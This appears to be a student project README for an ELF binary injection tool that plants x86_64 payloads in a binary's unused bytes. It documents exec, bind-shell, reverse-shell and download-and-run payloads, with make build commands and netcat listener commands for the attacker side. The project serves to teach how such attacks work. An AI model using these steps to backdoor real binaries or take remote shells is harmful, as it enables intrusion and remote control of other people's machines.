# Elf Injection (temporary)

### Advent of Coders

Alex Shao, Daniel Yang, Owen Zeng

### Project Description:

Executable binaries can be stored in a format known as ELF.
You can exploit the way that the binary is organized to inject malicious code into zeroed out bytes that aren't used.

### Instructions:

This is meant to be run on Linux as other operating systems use different executable formats.
Additionally, certain required tools such gcc, ld, and objcopy are built into Linux.
NASM and make are the only separate tools that need to be installed.

Please also note that the payloads are written for the x86_64 architecture.
Running these on ARM will not work unless you use an emulator.

#### Injection

Before you start injection, you must pick a payload to inject and figure out how to use it.
Looking at the section below will give you information on how to compile the .bin files whose contents will be injected into the file.
You must also follow the instructions how to exploit this payload once it's running.
For example, the download.bin payload will not work if there's no machine listening on a port to send it a file.

#### Payloads

To use the payloads, the makefile has the targets _payload_ and _test_payload_
The payload target will generate a .bin of the .text section of the compiled payload.
This contains the bytes that will be injected into the ELF using the other makefile targets.
The test_payload target will just run the payload to see what is supposed to happen if it were run properly after injection.

Both of these targets will accept an ASM parameter for the source file.

Some of the source files will also take an IP and PORT parameter to customize where an endpoint would be.

The following are what each payload does and how to use them:

<br>

**exec.asm**
This will execute `ls -lah` to print all the files.
It can be compiled using the following command:

```bash
$ make payload ASM=payloads/exec.asm
```

<br>

**bind_shell.asm**
This will open a TCP socket at a port specified by the PORT parameter (or 9000 by default).
From an attacker shell, you can connect to the machine's ip with the port and get a bind shell.

```bash
$ make payload ASM=payloads/bind_shell.asm PORT=8888
```

From the attacking shell connect using the following command (which assumes attacking shell is on the target machine):

```bash
$ nc localhost 8888
```

Otherwise replace localhost with the IP of the target machine.

<br>

**reverse_shell.asm**
This will connect to a TCP port on an attacking machine using the specified IP and PORT parameters.
From an attacker shell, you must listen using something like netcat:

```bash
$ nc -lvnp 8888
```

And the payload must be compiled with the following command (which assumes the target machine is listening for itself in another shell session):

```bash
$ make payload ASM=payloads/reverse_shell.asm IP=0.0.0.0 PORT=8888
```

<br>

**download.asm**
This will download any executable payload (maximum 4096 bytes) using the specified IP and PORT parameters.
The attacking shell must listen with a file as such:

```bash
$ nc -l 8888 < scary_stuff.sh
```

An example file could be a bash script that will echo the date into a file in /tmp to show proof of execution.

The payload must be compiled like so:

```bash
$ make payload ASM=payloads/download.asm IP=0.0.0.0 PORT=8888
```

Once again the IP can be replaced with that of the attacking machine.

### Resources/ References:

http://ouah.org/elf-pv.txt

https://hckng.org/~isra/articles/house-of-pain.html

https://www.man7.org/linux/man-pages/

https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

https://www.exploit-db.com/shellcodes

[![assignment due date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/B2vtqcJe)
